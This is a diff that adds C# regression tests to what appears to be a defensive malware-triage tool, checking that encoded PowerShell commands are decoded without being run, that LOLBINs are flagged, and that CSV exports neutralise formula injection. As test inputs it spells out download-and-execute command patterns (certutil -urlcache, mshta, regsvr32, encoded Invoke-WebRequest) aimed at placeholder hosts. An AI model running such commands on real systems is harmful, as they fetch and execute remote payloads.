@@ -3,6 +3,7 @@ using MRTW.Core;
 using Microsoft.Data.Sqlite;
 using System.IO.Compression;
 using System.Text;
+using System.Text.Json;
 using System.Diagnostics;
 
 var tests = new List<(string Name, Action Body)>
@@ -61,6 +62,16 @@ var tests = new List<(string Name, Action Body)>
     ,("static privacy mode redacts non-PE outputs and HTML triage", TestStaticPrivacyNonPeOutputs)
     ,("CLI static privacy JSON log redacts non-PE findings", TestCliStaticPrivacyJsonLog)
     ,("GUI initial-access triage binds encoded-content markers", TestGuiEncodedMarkerBinding)
+    ,("command normalization decodes bounded PowerShell text without execution", TestCommandNormalization)
+    ,("command normalization rejects malformed oversized and binary input", TestCommandNormalizationBounds)
+    ,("normalized commands export and privacy redaction round trip", TestNormalizedCommandExport)
+    ,("normalized command SQLite load and behavior evidence round trip", TestNormalizedCommandLoadAndEvidence)
+    ,("CSV values neutralize spreadsheet formulas", TestCsvFormulaNeutralization)
+    ,("command normalization budget caps work without throwing", TestCommandNormalizationBudget)
+    ,("behavior correlation shares command normalization budget across process groups", TestBehaviorCommandNormalizationBudget)
+    ,("command normalization rejects malformed UTF text", TestCommandNormalizationMalformedUtf)
+    ,("behavior evidence IDs follow final chronological event IDs", TestBehaviorEvidenceIdsAfterReindex)
+    ,("command normalization degraded quality persists through JSON and SQLite", TestCommandNormalizationQualityRoundTrip)
 };
 
 int failures = 0;
@@ -342,7 +353,7 @@ static void TestJsonBomRoundTrip()
         True(bytes.Length >= 3 && bytes[0] == 0xEF && bytes[1] == 0xBB && bytes[2] == 0xBF, "test fixture did not contain UTF-8 BOM");
         Equal("json-bom", new CaseService().Load(Path.Combine(root, "case.json")).CaseId);
     }
-    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
+    finally { SqliteConnection.ClearAllPools(); if (Directory.Exists(root)) Directory.Delete(root, true); }
 }
 
 static void TestBoundedCaptureQualityRoundTrip()
@@ -1039,6 +1050,132 @@ static void TestEvidenceGenerationCollision()
 static TimelineEvent E(int id, string action) =>
     new(id, TimeSpan.FromMilliseconds(id), "sample.exe", 7, EventCategory.Api, action, "", "",
         EventSeverity.Medium, "Regression", "{}", CapturedAtUtc: DateTimeOffset.UtcNow);
+
+static void TestCommandNormalization()
+{
+    string text = "Invoke-WebRequest https://example.invalid/a";
+    string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(text));
+    var powershell = CommandNormalizationService.Normalize("powershell.exe -EncodedCommand " + encoded).Single();
+    Equal("decoded", powershell.Status); Equal(text, powershell.Normalized); Equal("powershell", powershell.LolBin);
+    string utf8 = Convert.ToBase64String(Encoding.UTF8.GetBytes("certutil -urlcache -split -f https://example.invalid/b"));
+    var from = CommandNormalizationService.Normalize("[Convert]::FromBase64String('" + utf8 + "')").Single();
+    Equal("decoded", from.Status); True(from.Normalized.Contains("certutil", StringComparison.Ordinal), "FromBase64String was not decoded");
+    foreach (string bin in new[] { "certutil -decode a b", "rundll32 x.dll,Entry", "regsvr32 /s x.sct", "mshta https://example.invalid" })
+        True(!string.IsNullOrEmpty(CommandNormalizationService.Normalize(bin).Single().LolBin), "LOLBIN was not identified");
+}
+
+static void TestCommandNormalizationBounds()
+{
+    Equal("failed", CommandNormalizationService.Normalize("pwsh -enc AAAA").Single().Status);
+    Equal("bounded", CommandNormalizationService.Normalize("x" + new string('a', 16 * 1024)).Single().Status);
+    string binary = Convert.ToBase64String(new byte[] { 0, 0, 0, 0 });
+    Equal("failed", CommandNormalizationService.Normalize("powershell -enc " + binary).Single().Status);
+    // The service returns data only; this test deliberately supplies no executable target or invocation path.
+}
+
+static void TestNormalizedCommandExport()
+{
+    string root = Path.Combine(Path.GetTempPath(), "mrtw-normalized-" + Guid.NewGuid().ToString("N"));
+    try
+    {
+        var data = new CaseData("case-normalized", "normalized", "sample.exe", "C:\\secret\\sample.exe", "hash", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [], [], [], "note")
+        { NormalizedCommands = [new("powershell -enc C:\\Users\\secret\\x", "https://secret.invalid", "base64", "decoded", "", "powershell", "guid", 7, TimeSpan.Zero, [1])] };
+        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("json,csv,html,sqlite,zip", PrivacyMode: true));
+        True(File.Exists(Path.Combine(root, "normalized_commands.csv")), "normalized CSV missing");
+        foreach (string file in new[] { "case.json", "normalized_commands.csv", "report.html" })
+            True(!File.ReadAllText(Path.Combine(root, file)).Contains("secret.invalid", StringComparison.OrdinalIgnoreCase), "privacy redaction leaked normalized command");
+        using (var zip = ZipFile.OpenRead(Path.Combine(root, "case_export.zip")))
+        {
+            var commandEntry = zip.GetEntry("normalized_commands.csv") ?? throw new InvalidOperationException("normalized CSV missing from ZIP");
+            using var reader = new StreamReader(commandEntry.Open());
+            True(!reader.ReadToEnd().Contains("secret.invalid", StringComparison.OrdinalIgnoreCase), "privacy ZIP leaked normalized command");
+        }
+        using (var db = new SqliteConnection($"Data Source={Path.Combine(root, "case.sqlite")}"))
+        { db.Open(); using var cmd = db.CreateCommand(); cmd.CommandText = "SELECT COUNT(*) FROM normalized_commands"; Equal(1L, (long)cmd.ExecuteScalar()!); }
+    }
+    finally { SqliteConnection.ClearAllPools(); if (Directory.Exists(root)) Directory.Delete(root, true); }
+}
+
+static void TestNormalizedCommandLoadAndEvidence()
+{
+    string root = Path.Combine(Path.GetTempPath(), "mrtw-normalized-load-" + Guid.NewGuid().ToString("N"));
+    try
+    {
+        var eventWithCommand = new TimelineEvent(1, TimeSpan.Zero, "powershell.exe", 5, EventCategory.Process, "Process Start", "powershell -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes("Get-Date")), "", EventSeverity.Medium, "Hook", "{}", ProcessGuid: "p-guid");
+        var correlated = BehaviorCorrelator.Correlate([eventWithCommand]);
+        var behavior = correlated.Single(e => e.Action == "Encoded Command Decoded");
+        True(behavior.RawJson.Contains("evidence_event_ids", StringComparison.Ordinal), "behavior evidence ids missing");
+        var data = new CaseData("case-load", "load", "x.exe", "C:\\x.exe", "h", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], correlated, [], [], "") { NormalizedCommands = CommandNormalizationService.Normalize(eventWithCommand.ObjectValue) };
+        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("sqlite", Compress: false));
+        var loaded = new CaseService().Load(Path.Combine(root, "case.sqlite"));
+        Equal(1, loaded.NormalizedCommands.Count);
+    }
+    finally { SqliteConnection.ClearAllPools(); if (Directory.Exists(root)) Directory.Delete(root, true); }
+}
+
+static void TestCsvFormulaNeutralization()
+{
+    string root = Path.Combine(Path.GetTempPath(), "mrtw-csv-formula-" + Guid.NewGuid().ToString("N"));
+    try
+    {
+        var data = new CaseData("case-csv", "csv", "=SUM(1,1)", "C:\\x", "h", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [], [new ArtifactItem("x", "+cmd", DateTimeOffset.UtcNow, DateTimeOffset.UtcNow, 1, "@p", EventSeverity.Low)], [], "") { NormalizedCommands = [new("-danger", "=formula", "", "", "", "", "", null, null, [])] };
+        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("csv", Compress: false));
+        string csv = File.ReadAllText(Path.Combine(root, "artifacts.csv")); True(csv.Contains("'+cmd", StringComparison.Ordinal) && csv.Contains("'@p", StringComparison.Ordinal), "CSV formula marker was not neutralized");
+        True(File.ReadAllText(Path.Combine(root, "normalized_commands.csv")).Contains("'=formula", StringComparison.Ordinal), "normalized CSV formula marker was not neutralized");
+    }
+    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
+}
+
+static void TestCommandNormalizationBudget()
+{
+    var budget = new CommandNormalizationBudget();
+    for (int i = 0; i < CommandNormalizationBudget.MaxInputs + 5; i++) CommandNormalizationService.Normalize("powershell -enc AAAA", budget);
+    True(budget.Exhausted && budget.Dropped > 0, "command normalization budget did not record exhaustion");
+}
+
+static void TestBehaviorCommandNormalizationBudget()
+{
+    string command = "powershell -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes("Get-Date"));
+    var events = Enumerable.Range(1, CommandNormalizationBudget.MaxInputs + 10)
+        .Select(id => new TimelineEvent(id, TimeSpan.FromSeconds(id), "powershell.exe", id, EventCategory.Process, "Process Start", command, "", EventSeverity.Low, "Hook", "{}"))
+        .ToArray();
+    var budget = new CommandNormalizationBudget();
+    BehaviorCorrelator.Correlate(events, budget);
+    True(budget.Exhausted && budget.Dropped > 0, "behavior correlation bypassed the shared command-normalization budget");
+}
+
+static void TestCommandNormalizationMalformedUtf()
+{
+    string invalidUtf8 = "powershell FromBase64String('" + Convert.ToBase64String([0xc3, 0x28]) + "')";
+    string invalidUtf16 = "powershell -enc " + Convert.ToBase64String([0x00]);
+    True(CommandNormalizationService.Normalize(invalidUtf8).Single().Status == "failed", "invalid UTF-8 was accepted");
+    True(CommandNormalizationService.Normalize(invalidUtf16).Single().Status == "failed", "invalid UTF-16LE was accepted");
+}
+
+static void TestBehaviorEvidenceIdsAfterReindex()
+{
+    string command = "powershell -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes("Get-Date"));
+    var earlier = new TimelineEvent(40, TimeSpan.Zero, "cmd.exe", 4, EventCategory.Process, "Process Start", "cmd.exe", "", EventSeverity.Low, "Hook", "{}");
+    var encoded = new TimelineEvent(90, TimeSpan.FromSeconds(1), "powershell.exe", 4, EventCategory.Process, "Process Start", command, "", EventSeverity.Low, "Hook", "{}");
+    var behavior = BehaviorCorrelator.Correlate([encoded, earlier]).Single(e => e.Action == "Encoded Command Decoded");
+    using var document = JsonDocument.Parse(behavior.RawJson);
+    Equal(2, document.RootElement.GetProperty("evidence_event_ids")[0].GetInt32());
+}
+
+static void TestCommandNormalizationQualityRoundTrip()
+{
+    string root = Path.Combine(Path.GetTempPath(), "mrtw-command-quality-" + Guid.NewGuid().ToString("N"));
+    try
+    {
+        var health = new CollectorHealth("CommandNormalization", "degraded", DateTimeOffset.UtcNow, DateTimeOffset.UtcNow, CommandNormalizationBudget.MaxInputs, 3, "command-normalization-limit");
+        var data = new CaseData("case-quality", "quality", "x.exe", "C:\\x", "h", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [], [], [], "", new CaseQuality("degraded", [health], "observe", true));
+        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("json,sqlite", Compress: false));
+        var loaded = new CaseService().Load(Path.Combine(root, "case.sqlite"));
+        Equal("degraded", loaded.Quality!.OverallStatus); Equal("command-normalization-limit", loaded.Quality.Collectors.Single().Message);
+        True(File.ReadAllText(Path.Combine(root, "case.json")).Contains("command-normalization-limit", StringComparison.Ordinal), "quality missing from JSON");
+    }
+    finally { SqliteConnection.ClearAllPools(); if (Directory.Exists(root)) Directory.Delete(root, true); }
+}
 
 static void True(bool condition, string message)
 {
